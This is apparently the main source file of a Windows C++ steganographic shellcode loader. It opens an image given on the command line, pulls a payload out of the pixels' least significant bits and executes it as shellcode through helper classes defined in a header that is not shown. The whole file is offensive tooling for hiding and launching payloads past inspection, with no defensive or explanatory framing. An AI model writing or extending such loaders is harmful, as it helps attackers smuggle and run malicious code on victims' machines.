#include "reader.h"

int _tmain(int argc, TCHAR** argv) {

    if (argc == 3) {      
        // Init Gdiplus
        GdiplusStartupInput gdiplusStartupInput;
        ULONG_PTR gdiplusToken;
        GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

        // Do the job

        // TEMPLATES GO HERE
        auto img = Reader::Local(argv[2]);
        img.loadImage();

        auto alg = Reader::LSB(img.bm, _ttoi(argv[1]));
        alg.readImage();

        auto pld = Reader::Shellcode(alg.payload_data, alg.payload_bits);
        pld.Run();

        // Shutdown Gdiplus
        GdiplusShutdown(gdiplusToken);
    }

    return 0;
}